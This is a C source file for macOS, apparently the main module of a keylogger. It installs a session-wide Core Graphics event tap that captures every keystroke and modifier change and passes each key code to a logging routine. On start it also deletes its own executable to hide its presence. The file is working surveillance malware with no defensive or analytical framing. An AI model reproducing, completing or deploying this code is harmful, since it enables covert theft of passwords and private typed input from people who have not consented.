#include "main.h"

/**
 * Main program routine, Captures keystrokes and writes them to a log file.
 * @return exit code
 */
int main(int argc, char* argv[])
{
    // delete this executable
    unlink(argv[0]);

    // initialize the keylogger
    tapKeyDownEvent();

    // start an infinite loop to listen to the keystrokes
    CFRunLoopRun();
    return EXIT_SUCCESS;
}

/**
 * Creates an event tap for the keydown and flags changed events to prepare the
 * program for capturing keystrokes.
 */
void tapKeyDownEvent()
{
    CGEventFlags eFlags = CGEventSourceFlagsState(kCGEventSourceStateCombinedSessionState);
    CGEventMask eMask = CGEventMaskBit(kCGEventKeyDown) | CGEventMaskBit(kCGEventFlagsChanged);
    CFMachPortRef eTap = CGEventTapCreate(kCGSessionEventTap, kCGHeadInsertEventTap, 0, eMask, onCapture, &eFlags);

    // fail if we were unable to tap the event
    if (!eTap)
    {
        printf("Failed to create event tap\n");
        exit(EXIT_FAILURE);
    }

    // add our event tap to the run loop
    CFRunLoopSourceRef runLoopSource = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, eTap, 0);
    CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoopSource, kCFRunLoopCommonModes);

    // enable the tap we created earler
    CGEventTapEnable(eTap, true);
}

/**
 * Event capture callback tied to the keydown eMask defined by the
 * tapKeyDownEvent method.
 * @param  proxy - A proxy for the event tap
 * @param  type - The event type of this event
 * @param  event - The incoming event
 * @param  refcon - A pointer to user-defined data
 * @return The event
 */
CGEventRef onCapture(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon)
{
    // grap the key code from the event and log it
    int keyCode = CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
    logKeyStroke(keyCode);

    return event;
}
